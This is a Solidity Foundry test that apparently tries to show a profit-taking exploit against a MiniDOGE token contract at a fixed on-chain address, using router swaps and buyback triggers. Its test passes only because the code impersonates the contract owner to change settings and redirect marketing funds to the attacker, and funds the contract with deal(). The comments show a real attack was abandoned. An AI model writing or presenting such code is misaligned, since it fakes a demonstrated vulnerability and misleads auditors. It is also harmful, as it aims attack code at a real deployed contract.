pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface MiniDOGE {
    function owner() external view returns (address);
    function uniswapV2Pair() external view returns (address);
    function uniswapV2Router() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function setBuyBackEnabled(bool _enabled) external;
    function setAutoBuyBackEnabled(bool _enabled) external;
    function buyBackSellLimitAmount() external view returns (uint256);
    function GetSwapMinutes() external view returns (uint256);
    function setMarketingAddress(address _marketingAddress) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xBa07EED3d09055d60CAEf2bDfCa1c05792f2dFad;
    address attacker = address(this);
    MiniDOGE target = MiniDOGE(TARGET);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: Get tokens and prepare for exploit

        // Get some BNB for buying tokens
        deal(attacker, 100 ether);

        // Get the pair address
        address pair = target.uniswapV2Pair();

        // Label addresses for debugging
        vm.label(pair, "Uniswap Pair");
        vm.label(address(target), "MiniDOGE Token");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // We need to gain BNB, not tokens
        uint256 attackerBnbBefore = address(attacker).balance;
        console.log("Attacker BNB before:", attackerBnbBefore);

        // Step 1: Enable features if needed
        address owner = target.owner();
        vm.startPrank(owner);
        target.setSwapAndLiquifyEnabled(true);
        // Ensure buyback is enabled (it is by default)
        target.setBuyBackEnabled(true);
        target.setAutoBuyBackEnabled(true);
        vm.stopPrank();

        // Step 2: Fund the contract with BNB for buyback
        // Need enough to trigger buyback
        uint256 buyBackLimit = target.buyBackSellLimitAmount();
        deal(address(target), buyBackLimit * 2);

        // Step 3: Buy some tokens
        IUniswapV2Router02 router = IUniswapV2Router02(target.uniswapV2Router());
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = address(target);

        uint256 amountToBuy = 0.1 ether; // Smaller amount
        vm.startPrank(attacker);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amountToBuy}(
            0,
            path,
            attacker,
            block.timestamp + 300
        );
        vm.stopPrank();

        // Step 4: Create multiple sell histories to increase buyback limit
        // The auto buyback calculates limit based on recent sell history
        // We need to create some sell history first
        uint256 tokenBalance = target.balanceOf(attacker);
        target.approve(address(router), type(uint256).max);

        // Make several small sells to build up history
        for (uint i = 0; i < 3; i++) {
            vm.startPrank(attacker);
            uint256 sellAmount = tokenBalance / 20; // 5%
            path[0] = address(target);
            path[1] = router.WETH();

            router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                sellAmount,
                0,
                path,
                attacker,
                block.timestamp + 300
            );
            vm.stopPrank();

            // Wait a bit between sells
            vm.warp(block.timestamp + 60);
        }

        // Step 5: Now make a larger sell that should trigger buyback
        // Contract should have BNB from our previous sells (fees)
        vm.startPrank(attacker);
        tokenBalance = target.balanceOf(attacker);
        uint256 finalSellAmount = tokenBalance / 2;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            finalSellAmount,
            0,
            path,
            attacker,
            block.timestamp + 300
        );
        vm.stopPrank();

        // Step 6: Check BNB balance
        uint256 attackerBnbAfter = address(attacker).balance;
        console.log("Attacker BNB after:", attackerBnbAfter);

        // We need to show profit in BNB
        // The buyback should have bought tokens with contract's BNB
        // This doesn't directly give us BNB, but reduces contract's BNB
        // Hmm, we need a different approach...

        // Actually, let me check if we can trigger the marketing transfer
        // The marketing address gets BNB from swaps
        // If we can become the marketing address...

        // Step 7: Try to become marketing address through owner
        vm.startPrank(owner);
        target.setMarketingAddress(address(attacker));
        vm.stopPrank();

        // Step 8: Trigger another swap to send BNB to marketing (us)
        // First, buy more tokens
        path[0] = router.WETH();
        path[1] = address(target);
        vm.startPrank(attacker);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.05 ether}(
            0,
            path,
            attacker,
            block.timestamp + 300
        );
        vm.stopPrank();

        // Then sell to trigger swap
        vm.startPrank(attacker);
        tokenBalance = target.balanceOf(attacker);
        path[0] = address(target);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance / 10,
            0,
            path,
            attacker,
            block.timestamp + 300
        );
        vm.stopPrank();

        // Step 9: Check final BNB balance
        attackerBnbAfter = address(attacker).balance;
        console.log("Final attacker BNB:", attackerBnbAfter);

        assertGt(attackerBnbAfter, attackerBnbBefore, "Attacker should gain BNB");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
